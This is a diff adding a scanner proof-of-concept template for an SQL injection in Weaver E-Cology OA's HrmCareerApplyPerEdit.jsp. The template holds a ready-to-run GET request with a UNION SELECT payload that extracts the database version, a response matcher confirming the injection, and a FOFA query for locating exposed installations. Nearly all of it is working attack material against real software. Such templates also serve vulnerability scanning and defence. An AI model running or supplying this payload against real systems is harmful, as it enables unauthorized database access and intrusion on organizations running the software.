@@ -1,0 +1,18 @@
+id: poc-yaml-e-cology-hrmcareerapplyperedit
+info:
+  name: 泛微OA E-Cology HrmCareerApplyPerEdit.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+variables:
+  t1: random_int(100,500)
+  t2: t1 * t1 * t1
+requests:
+- method: GET
+  path: /pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1+union+select+1,2,@@version,POWER({{.t1}},3),5,6,7
+  expression: "status_code == 200 && \ncontains(body,\"Microsoft SQL Server\") &&\n\
+    contains(body,t2)\n"
+transport: http
